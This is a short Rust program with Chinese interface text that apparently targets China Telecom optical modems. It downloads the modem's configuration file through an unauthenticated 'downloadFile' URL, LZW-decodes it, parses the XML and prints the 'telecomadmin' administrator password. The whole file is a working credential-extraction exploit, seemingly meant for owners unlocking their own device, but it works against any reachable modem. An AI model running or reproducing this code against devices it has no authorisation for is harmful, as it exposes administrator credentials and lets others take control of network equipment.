extern crate reqwest;
extern crate lzw;
extern crate quick_xml;

use std::{io, net, io::Read};
use lzw::{MsbReader, DecoderEarlyChange};
use quick_xml::{Reader, events::Event};

fn main() {
    println!("================================================================");
    println!("本工具为免费使用，若您为本工具支付了任何费用，请申请退款。");
    println!("================================================================");
    println!("请输入光猫的IP地址:");
    let mut modem_ip = String::new();
    io::stdin().read_line(&mut modem_ip).expect("无效输入。");
    let modem_ip: net::Ipv4Addr = modem_ip.trim().parse().expect("无效IP地址。");
    let psi_url = format!("http://{}/downloadFile?file=/var/config/psi", modem_ip);
    let mut resp = reqwest::get(&psi_url[..]).expect("无法访问光猫。");
    if !resp.status().is_success() {
        panic!("无法访问光猫。");
    }
    let mut psi_content: Vec<u8> = Vec::new();
    resp.read_to_end(&mut psi_content).expect("解析光猫配置错误");
    let psi_body = psi_content.split_off(60);
    let mut lzw_decoder = DecoderEarlyChange::new(MsbReader::new(), 8);
    let mut decoded_len = 0;
    let mut decoded_config: Vec<u8> = Vec::new();
    loop
    {
        let (consumed, decoded_part) = lzw_decoder.decode_bytes(&psi_body[decoded_len..]).expect("解析光猫配置错误。");
        decoded_config.append(&mut decoded_part.to_vec());
        decoded_len = decoded_len + consumed;
        if decoded_len >= psi_body.len()
        {
            break;
        }
    }
    let decoded_config = String::from_utf8(decoded_config).unwrap();
    let mut xml_reader = Reader::from_str(&decoded_config);
    xml_reader.trim_text(true);
    let mut buf = Vec::new();
    let mut admin_tag = false;
    let mut get_password = false;
    loop {
        match xml_reader.read_event(&mut buf) {
            Ok(Event::Start(ref e)) => {
                match e.name() {
                    b"X_CT-COM_TeleComAccount" => admin_tag = true,
                    b"Password" => get_password = admin_tag,
                    _ => (),
                }
            },
            Ok(Event::Text(e)) => {
                if get_password {
                    println!("telecomadmin 密码：{}", e.unescape_and_decode(&xml_reader).unwrap());
                    return;
                }
            },
            Ok(Event::Eof) => break,
            _ => (),
        }
        buf.clear();
    }

    println!("无法获取telecomadmin密码。");
}
